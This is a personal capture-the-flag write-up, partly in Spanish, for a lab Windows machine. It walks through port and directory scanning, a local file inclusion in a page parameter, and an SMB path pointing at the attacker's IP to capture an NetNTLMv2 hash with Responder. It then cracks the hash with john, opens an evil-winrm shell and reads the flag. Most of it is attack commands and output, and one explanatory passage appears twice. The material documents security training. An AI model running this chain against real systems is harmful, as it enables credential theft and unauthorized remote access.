```
┌──(julicc㉿diavlo)-[~]
└─$ nmap -sV 10.129.79.169
Starting Nmap 7.98 ( https://nmap.org ) at 2026-04-15 16:26 +0200
Nmap scan report for unika.htb (10.129.79.169)
Host is up (0.043s latency).
Not shown: 998 filtered tcp ports (no-response)
PORT     STATE SERVICE VERSION
80/tcp   open  http    Apache httpd 2.4.52 ((Win64) OpenSSL/1.1.1m PHP/8.1.1)
5985/tcp open  http    Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 12.18 seconds
```

```
┌──(julicc㉿diavlo)-[~]
└─$ echo "10.129.79.169    unika.htb" | sudo tee -a /etc/hosts
[sudo] password for julicc:
10.129.79.169    unika.htb
```

![[Pasted image 20260415162605.png]]
```
gobuster dir -u 10.129.79.169 --wordlist "/usr/share/wordlists/dirbuster/directory-list-2.3-small.txt"
===============================================================
Gobuster v3.8.2
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.129.79.169
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.8.2
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
# license, visit http://creativecommons.org/licenses/by-sa/3.0/ (Status: 403) [Size: 302]
img                  (Status: 301) [Size: 336] [--> http://10.129.79.169/img/]
css                  (Status: 301) [Size: 336] [--> http://10.129.79.169/css/]
js                   (Status: 301) [Size: 335] [--> http://10.129.79.169/js/]
examples             (Status: 503) [Size: 402]
licenses             (Status: 403) [Size: 421]
inc                  (Status: 301) [Size: 336] [--> http://10.129.79.169/inc/]
IMG                  (Status: 301) [Size: 336] [--> http://10.129.79.169/IMG/]
*checkout*           (Status: 403) [Size: 302]
CSS                  (Status: 301) [Size: 336] [--> http://10.129.79.169/CSS/]
Img                  (Status: 301) [Size: 336] [--> http://10.129.79.169/Img/]
JS                   (Status: 301) [Size: 335] [--> http://10.129.79.169/JS/]
phpmyadmin           (Status: 403) [Size: 421]
webalizer            (Status: 403) [Size: 421]
*docroot*            (Status: 403) [Size: 302]
*                    (Status: 403) [Size: 302]
con                  (Status: 403) [Size: 302]
**http%3a            (Status: 403) [Size: 302]
Progress: 40550 / 87663 (46.26%)^C
```
Nos fijamos en las redirecciones:
![[Pasted image 20260415162803.png]]
?page=french.html, Puede ser una LFI (Local File Inclusion) vulnerability?
![[Pasted image 20260415163145.png]]
Los enlaces no están sanitizados, explicación del Writeup (sin el de momento no se hacer na más que el escaneo):
Great, LFI is possible as we can view the contents of the C:\windows\system32\drivers\etc\hosts file in the response. The file inclusion, in this case, was made possible because in the backend the include() method of PHP is being used to process the URL parameter page for serving a different webpage for different languages. And because no proper sanitization is being done on this page parameter, we were able to pass malicious input and therefore view the internal system files.

We know that this web page is vulnerable to the file inclusion vulnerability and is being served on a
Windows machine. Thus, there exists a potential for including a file on our attacker workstation. If we select
a protocol like SMB, Windows will try to authenticate to our machine, and we can capture the NetNTLMv2.
What is NTLM (New Technology Lan Manager)?
NTLM is a collection of authentication protocols created by Microsoft. It is a challenge-response
authentication protocol used to authenticate a client to a resource on an Active Directory domain.
It is a type of single sign-on (SSO) because it allows the user to provide the underlying authentication factor
only once, at login.
The NTLM authentication process is done in the following way :
1. The client sends the user name and domain name to the server.
2. The server generates a random character string, referred to as the challenge.
3. The client encrypts the challenge with the NTLM hash of the user password and sends it back to the
server.
4. The server retrieves the user password (or equivalent).
5. The server uses the hash value retrieved from the security account database to encrypt the challenge
string. The value is then compared to the value received from the client. If the values match, the client
is authenticated.

We know that this web page is vulnerable to the file inclusion vulnerability and is being served on a Windows machine. Thus, there exists a potential for including a file on our attacker workstation. If we select a protocol like SMB, Windows will try to authenticate to our machine, and we can capture the NetNTLMv2.
What is NTLM (New Technology Lan Manager)?
NTLM is a collection of authentication protocols created by Microsoft. It is a challenge-response authentication protocol used to authenticate a client to a resource on an Active Directory domain. It is a type of single sign-on (SSO) because it allows the user to provide the underlying authentication factor
only once, at login.
The NTLM authentication process is done in the following way :
1. The client sends the user name and domain name to the server.
2. The server generates a random character string, referred to as the challenge.
3. The client encrypts the challenge with the NTLM hash of the user password and sends it back to the server.
4. The server retrieves the user password (or equivalent).
5. The server uses the hash value retrieved from the security account database to encrypt the challenge string. The value is then compared to the value received from the client. If the values match, the client is authenticated.
A more detailed explanation of the working of NTLM authentication can be found here.
NTLM vs NTHash vs NetNTMLv2
The terminology around NTLM authentication is messy, and even pros misuse it from time to time, so let's
get some key terms defined:
A hash function is a one-way function that takes any amount of data and returns a fixed size value.
Typically, the result is referred to as a hash, digest, or fingerprint. They are used for storing passwords
more securely, as there's no way to convert the hash directly back to the original data (though there
are attacks to attempt to recover passwords from hashes, as we'll see later). So a server can store a
hash of your password, and when you submit your password to the site, it hashes your input, and
compares the result to the hash in the database, and if they match, it knows you supplied the correct
password.
An NTHash is the output of the algorithm used to store passwords on Windows systems in the SAM
database and on domain controllers. An NTHash is often referred to as an NTLM hash or even just an
NTLM, which is very misleading / confusing.
When the NTLM protocol wants to do authentication over the network, it uses a challenge / response
model as described above. A NetNTLMv2 challenge / response is a string specifically formatted to
include the challenge and response. This is often referred to as a NetNTLMv2 hash, but it's not actually
a hash. Still, it is regularly referred to as a hash because we attack it in the same manner. You'll see
NetNTLMv2 objects referred to as NTLMv2, or even confusingly as NTLM.

In the PHP configuration file php.ini , "allow_url_include" wrapper is set to "Off" by default, indicating that
PHP does not load remote HTTP or FTP URLs to prevent remote file inclusion attacks. However, even if
allow_url_include and allow_url_fopen are set to "Off", PHP will not prevent the loading of SMB URLs.
In our case, we can misuse this functionality to steal the NTLM hash.

```
[!] Responder must be run as root.

┌──(julicc㉿diavlo)-[~]
└─$ sudo !!

┌──(julicc㉿diavlo)-[~]
└─$ sudo responder -I tun0
[sudo] password for julicc:
                                         __
  .----.-----.-----.-----.-----.-----.--|  |.-----.----.
  |   _|  -__|__ --|  _  |  _  |     |  _  ||  -__|   _|
  |__| |_____|_____|   __|_____|__|__|_____||_____|__|
                   |__|


[*] Tips jar:
    USDT -> 0xCc98c1D3b8cd9b717b5257827102940e4E17A19A
    BTC  -> bc1q9360jedhhmps5vpl3u05vyg4jryrl52dmazz49

[+] Poisoners:
    LLMNR                      [ON]
    NBT-NS                     [ON]
    MDNS                       [ON]
    DNS                        [ON]
    DHCP                       [OFF]
    DHCPv6                     [OFF]

[+] Servers:
    HTTP server                [ON]
    HTTPS server               [ON]
    WPAD proxy                 [OFF]
    Auth proxy                 [OFF]
    SMB server                 [ON]
    Kerberos server            [ON]
    SQL server                 [ON]
    FTP server                 [ON]
    IMAP server                [ON]
    POP3 server                [ON]
    SMTP server                [ON]
    DNS server                 [ON]
    LDAP server                [ON]
    MQTT server                [ON]
    RDP server                 [ON]
    DCE-RPC server             [ON]
    WinRM server               [ON]
    SNMP server                [ON]

[+] HTTP Options:
    Always serving EXE         [OFF]
    Serving EXE                [OFF]
    Serving HTML               [OFF]
    Upstream Proxy             [OFF]

[+] Poisoning Options:
    Analyze Mode               [OFF]
    Force WPAD auth            [OFF]
    Force Basic Auth           [OFF]
    Force LM downgrade         [OFF]
    Force ESS downgrade        [OFF]

[+] Generic Options:
    Responder NIC              [tun0]
    Responder IP               [10.10.16.225]
    Responder IPv6             [fe80::8c38:e817:bbf9:6d8c]
    Challenge set              [random]
    Don't Respond To Names     ['ISATAP', 'ISATAP.LOCAL']
    Don't Respond To MDNS TLD  ['_DOSVC']
    TTL for poisoned response  [default]

[+] Current Session Variables:
    Responder Machine Name     [WIN-L5FB9JJC7VD]
    Responder Domain Name      [ES2C.LOCAL]
    Responder DCE-RPC Port     [45740]

[*] Version: Responder 3.2.2.0
[*] Author: Laurent Gaffie, <lgaffie@secorizon.com>

[+] Listening for events...
[SMB] NTLMv2-SSP Client   : 10.129.79.169
[SMB] NTLMv2-SSP Username : RESPONDER\Administrator
[SMB] NTLMv2-SSP Hash     : Administrator::RESPONDER:4198d1d8a1688c5e:A0FA6A874359EE98A4536357517D5934:01010000000000008063F76EF6CCDC01AC9E649B306478330000000002000800450053003200430001001E00570049004E002D004C0035004600420039004A004A00430037005600440004003400570049004E002D004C0035004600420039004A004A0043003700560044002E0045005300320043002E004C004F00430041004C000300140045005300320043002E004C004F00430041004C000500140045005300320043002E004C004F00430041004C00070008008063F76EF6CCDC0106000400020000000800300030000000000000000100000000200000F1D761D981AA0A33C10CC1071F8BAB42EDA0E68B52FFF2F7453E90FFBD1B494F0A001000000000000000000000000000000000000900220063006900660073002F00310030002E00310030002E00310036002E00320032003500000000000000000
```
Paralelamente hemos ejecutado lo siguiente en el navegador:
`http://unika.htb/?page=//10.10.16.225/whatever`

```
┌──(julicc㉿diavlo)-[~]
└─$ john -w=/usr/share/wordlists/rockyou.txt hash.txt
Using default input encoding: UTF-8
Loaded 1 password hash (netntlmv2, NTLMv2 C/R [MD4 HMAC-MD5 32/64])
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
badminton        (Administrator)
1g 0:00:00:00 DONE (2026-04-15 16:56) 33.33g/s 136533p/s 136533c/s 136533C/s slimshady..oooooo
Use the "--show --format=netntlmv2" options to display all of the cracked passwords reliably
Session completed.
```

EvilRM:
```
┌──(julicc㉿diavlo)-[~]
└─$ evil-winrm -i 10.129.79.169 -u administrator -p badminton

Evil-WinRM shell v3.9

Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline

Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Administrator\Documents> dir
*Evil-WinRM* PS C:\Users\Administrator\Documents> cd ..\Desktop
*Evil-WinRM* PS C:\Users\Administrator\Desktop> dir
*Evil-WinRM* PS C:\Users\Administrator\Desktop> dir ..\..


    Directory: C:\Users


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
d-----          3/9/2022   5:35 PM                Administrator
d-----          3/9/2022   5:33 PM                mike
d-r---        10/10/2020  12:37 PM                Public


*Evil-WinRM* PS C:\Users\Administrator\Desktop> type ..\..\mike\Desktop\flag.txt
ea81b7afddd03efaa0945333ed147fac
```